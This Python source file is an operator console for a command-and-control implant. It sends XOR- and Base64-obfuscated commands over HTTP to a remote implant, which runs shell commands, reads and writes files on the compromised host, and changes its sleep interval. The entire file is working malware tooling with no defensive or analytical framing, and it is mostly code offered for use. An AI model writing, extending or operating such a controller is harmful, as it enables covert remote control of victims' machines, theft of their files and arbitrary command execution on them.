import json
import base64
import sys
import argparse

import requests
from requests.exceptions import ConnectionError, Timeout, HTTPError

try:
    from rich.console import Console
    from rich.syntax import Syntax
    from rich.panel import Panel
    _RICH = True
    console = Console()
except ImportError:
    _RICH = False

try:
    from prompt_toolkit import PromptSession
    from prompt_toolkit.history import InMemoryHistory
    from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
    from prompt_toolkit.completion import WordCompleter
    _PT = True
except ImportError:
    _PT = False

XOR_KEY = b'keyed_up'

def _xor(data):
    k = len(XOR_KEY)
    return bytes([b ^ XOR_KEY[i % k] for i, b in enumerate(data)])

def encode(msg) -> bytes:
    """JSON → XOR → Base64."""
    return base64.b64encode(_xor(json.dumps(msg).encode()))

def decode(data: bytes) -> dict:
    """Base64 → XOR → JSON."""
    return json.loads(_xor(base64.b64decode(data)).decode())

class ImplantConn:
    """
    Sends encoded commands to the implant over HTTP POST.

    Every request:
      POST <base_url>/command
      Content-Type: application/octet-stream
      Body: Base64(XOR(JSON(message)))

    Every response:
      Body: Base64(XOR(JSON(response)))
    """

    def __init__(self, host: str, port: int, timeout: int = 10):
        scheme = "http" if not host.startswith("http") else ""
        self.base_url = f"{scheme}{'://' if scheme else ''}{host}:{port}"
        self.timeout  = timeout
        self._req     = 1
        self._session = requests.Session()
        self._session.headers.update({"Content-Type": "application/octet-stream"})

    def connect(self):
        """Verify the implant is reachable via GET /ping."""
        url = f"{self.base_url}/ping"
        resp = self._session.get(url, timeout=self.timeout)
        resp.raise_for_status()

    def close(self):
        self._session.close()

    def send(self, cmd_type: str, payload: dict) -> dict:
        """Encode a command, POST it, decode and return the response."""
        msg  = {"type": cmd_type, "request_id": self._req, "payload": payload}
        body = encode(msg)
        self._req += 1

        url  = f"{self.base_url}/command"
        resp = self._session.post(url, data=body, timeout=self.timeout)
        resp.raise_for_status()

        return decode(resp.content)

def print_response(resp):
    text = json.dumps(resp, indent=2)
    if _RICH:
        rtype  = resp.get("type", "")
        border = "red" if rtype == "error" else "green"
        title  = f"[bold]{rtype}[/bold]  req={resp.get('request_id','?')}"
        console.print(Panel(
            Syntax(text, "json", theme="monokai", word_wrap=True),
            title=title, border_style=border,
        ))
    else:
        print("Response:", text)

def err(msg):
    if _RICH: console.print(f"[!] {msg}", style="bold red")
    else: print(f"[!] {msg}")

def info(msg):
    if _RICH: console.print(f"[*] {msg}", style="bold cyan")
    else: print(f"[*] {msg}")

COMMANDS = ["HELLO","SHUTDOWN","SET_SLEEP","READ_DATA","WRITE_DATA","RUN_CMD",
            "help","exit","quit"]

HELP_TEXT = """
  HELLO                          Ping the implant
  SET_SLEEP <seconds>            Set implant sleep interval
  RUN_CMD   <command>            Execute a shell command
  READ_DATA  [filename]          Read a file from the implant
  WRITE_DATA <filename> <data>   Write data to a file on the implant
  SHUTDOWN                       Shut the implant down
  exit / quit                    Disconnect and exit
"""

BANNER = r"""
  ██████╗██████╗      ██████╗██╗     ██╗
 ██╔════╝╚════██╗    ██╔════╝██║     ██║
 ██║      █████╔╝    ██║     ██║     ██║
 ██║     ██╔═══╝     ██║     ██║     ██║
 ╚██████╗███████╗    ╚██████╗███████╗██║
  ╚═════╝╚══════╝     ╚═════╝╚══════╝╚═╝
   Operator CLI  |  XOR/b64 HTTP implant
"""


def run_repl(conn: ImplantConn):
    if _RICH: console.print(BANNER, style="bold cyan")
    else: print(BANNER)

    info(f"Connected to implant at {conn.base_url}")
    info("Type 'help' for commands\n")

    if _PT:
        session = PromptSession(
            history=InMemoryHistory(),
            auto_suggest=AutoSuggestFromHistory(),
            completer=WordCompleter(COMMANDS, ignore_case=True),
        )
        _input = lambda: session.prompt("> ")
    else:
        _input = lambda: input("> ")

    while True:
        try:
            line = _input().strip()
        except (KeyboardInterrupt, EOFError):
            print(); break

        if not line:
            continue

        parts = line.split()
        cmd   = parts[0].upper()
        args  = parts[1:]

        if cmd in ("EXIT", "QUIT"):
            break
        if cmd == "HELP":
            print(HELP_TEXT); continue

        # ── Build payload per command ──────────────
        if cmd == "HELLO":
            payload = {}
        elif cmd == "SHUTDOWN":
            payload = {}
        elif cmd == "SET_SLEEP":
            if not args: err("Usage: SET_SLEEP <seconds>"); continue
            try: payload = {"seconds": int(args[0])}
            except ValueError: err("Seconds must be an integer"); continue
        elif cmd == "READ_DATA":
            payload = {"filename": args[0]} if args else {}
        elif cmd == "WRITE_DATA":
            if len(args) < 2: err("Usage: WRITE_DATA <filename> <data>"); continue
            payload = {"filename": args[0], "data": " ".join(args[1:])}
        elif cmd == "RUN_CMD":
            if not args: err("Usage: RUN_CMD <command>"); continue
            payload = {"command": " ".join(args)}
        else:
            err(f"Unknown command: '{cmd}'. Type 'help'."); continue

        # ── Send over HTTP ─────────────────────────
        try:
            resp = conn.send(cmd, payload)
            print_response(resp)
        except (ConnectionError, Timeout) as exc:
            err(f"Lost connection: {exc}"); break
        except HTTPError as exc:
            err(f"HTTP error from implant: {exc}"); continue
        except Exception as exc:
            err(f"Error: {exc}"); continue

        if cmd == "SHUTDOWN":
            break

    conn.close()
    info("Disconnected.")

def main():
    parser = argparse.ArgumentParser(description="Operator CLI (HTTP)")
    parser.add_argument("host", help="Implant host (e.g. 127.0.0.1 or http://192.168.1.5)")
    parser.add_argument("port", nargs="?", type=int, default=8080,
                        help="Implant HTTP port (default: 8080)")
    parser.add_argument("--timeout", type=int, default=10,
                        help="Request timeout in seconds (default: 10)")
    a = parser.parse_args()

    conn = ImplantConn(a.host, a.port, timeout=a.timeout)
    try:
        conn.connect()
    except Exception as exc:
        err(f"Cannot reach implant at {conn.base_url} — {exc}")
        sys.exit(1)

    run_repl(conn)


if __name__ == "__main__":
    main()
